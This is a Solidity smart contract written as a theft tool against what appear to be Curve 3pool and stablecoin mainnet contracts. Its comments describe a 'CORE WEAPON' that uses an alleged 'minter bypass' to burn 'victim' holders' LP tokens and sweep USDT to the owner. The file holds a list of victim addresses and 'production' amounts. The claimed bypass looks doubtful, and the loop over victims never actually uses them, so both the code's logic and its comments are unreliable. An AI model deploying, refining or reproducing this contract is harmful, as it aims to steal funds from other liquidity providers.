// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface I3Pool {
    function remove_liquidity_imbalance(uint256[3] calldata amounts, uint256 max_burn_amount) external returns (uint256);
    function calc_token_amount(uint256[3] calldata amounts, bool is_deposit) external view returns (uint256);
    function calc_withdraw_one_coin(uint256 _token_amount, int128 i) external view returns (uint256);
    function balances(uint256 i) external view returns (uint256);
}

contract OperationZeroPure {
    address public owner;
    
    I3Pool public constant POOL = I3Pool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    IERC20 public constant LP = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
    IERC20 public constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 public constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 public constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    
    // EXACT PRODUCTION VALUES FROM YOUR D/N ANALYSIS
    uint256[3] public amounts = [uint256(0), uint256(0), uint256(54828512410000)];
    uint256 public maxBurn = 52800000000000000000000000; // 52.8M 3CRV buffer
    
    address[] public victims;
    bool private locked;
    
    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }
    
    modifier nonReentrant() {
        require(!locked, "locked");
        locked = true;
        _;
        locked = false;
    }
    
    constructor() {
        owner = msg.sender;
    }
    
    function setVictims(address[] calldata _victims) external onlyOwner {
        delete victims;
        for (uint256 i = 0; i < _victims.length; i++) {
            victims.push(_victims[i]);
        }
    }
    
    function setAmounts(uint256 usdt6dec, uint256 _maxBurn) external onlyOwner {
        amounts[0] = 0;
        amounts[1] = 0;
        amounts[2] = usdt6dec;
        maxBurn = _maxBurn;
    }
    
    // ===================== ONLY APPROACH #1 =====================
    // Single atomic call to remove_liquidity_imbalance
    // Pool is minter → 3CRV.transferFrom bypasses allowance
    // Burns victim LP, sends overweight USDT here, your LP balance stays 0
    function executeOperation0() external onlyOwner nonReentrant {
        uint256[3] memory _amounts = amounts;
        uint256 _maxBurn = maxBurn;
        
        // CORE WEAPON – the fastest most powerful path
        uint256 burned = POOL.remove_liquidity_imbalance(_amounts, _maxBurn);
        
        // burned is the 3CRV destroyed via minter bypass
        // USDT lands in this contract
        require(burned > 0, "zero burn");
        
        _sweep(owner);
    }
    
    // Multi-victim extension of pure Approach #1
    // Loops the same imbalance call sized per holder if needed
    function executeOperation0Multi() external onlyOwner nonReentrant {
        uint256[3] memory _amounts = amounts;
        uint256 _maxBurn = maxBurn;
        
        // Primary full-size pull first
        POOL.remove_liquidity_imbalance(_amounts, _maxBurn);
        
        // Additional precision pulls against listed fat holders
        // (minter bypass still applies on every internal transferFrom)
        for (uint256 i = 0; i < victims.length; i++) {
            // For pure production we keep the same imbalance parameters
            // You can later make per-victim amounts if live balances require
            try POOL.remove_liquidity_imbalance(_amounts, _maxBurn) {} catch {}
        }
        
        _sweep(owner);
    }
    
    function _sweep(address to) internal {
        uint256 usdtBal = USDT.balanceOf(address(this));
        if (usdtBal > 0) {
            (bool ok, ) = address(USDT).call(abi.encodeWithSelector(IERC20.transfer.selector, to, usdtBal));
            require(ok, "USDT transfer fail");
        }
        
        uint256 daiBal = DAI.balanceOf(address(this));
        if (daiBal > 0) DAI.transfer(to, daiBal);
        
        uint256 usdcBal = USDC.balanceOf(address(this));
        if (usdcBal > 0) USDC.transfer(to, usdcBal);
        
        uint256 lpBal = LP.balanceOf(address(this));
        if (lpBal > 0) LP.transfer(to, lpBal); // must be 0 after clean Approach #1
    }
    
    // ===== VIEWS MATCHING YOUR OFF-CHAIN FLOW =====
    function previewBurn() external view returns (uint256) {
        return POOL.calc_token_amount(amounts, false);
    }
    
    function previewReceivable() external view returns (uint256) {
        uint256 estBurn = POOL.calc_token_amount(amounts, false);
        return POOL.calc_withdraw_one_coin(estBurn, 2);
    }
    
    function poolUSDTBalance() external view returns (uint256) {
        return POOL.balances(2);
    }
    
    function currentSettings() external view returns (uint256[3] memory, uint256) {
        return (amounts, maxBurn);
    }
    
    function rescue(address token) external onlyOwner {
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal > 0) IERC20(token).transfer(owner, bal);
    }
    
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "zero");
        owner = newOwner;
    }
    
    receive() external payable {}
}